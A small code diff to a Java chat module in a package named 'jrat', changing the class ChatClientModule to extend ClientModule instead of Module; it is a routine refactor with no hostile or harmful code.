@@ -1,9 +1,9 @@
 package jrat.module.chat;
 
-import jrat.api.Module;
+import jrat.api.ClientModule;
 import jrat.client.packets.incoming.IncomingPackets;
 
-public class ChatClientModule extends Module {
+public class ChatClientModule extends ClientModule {
 
     public static FrameChat instance;
 
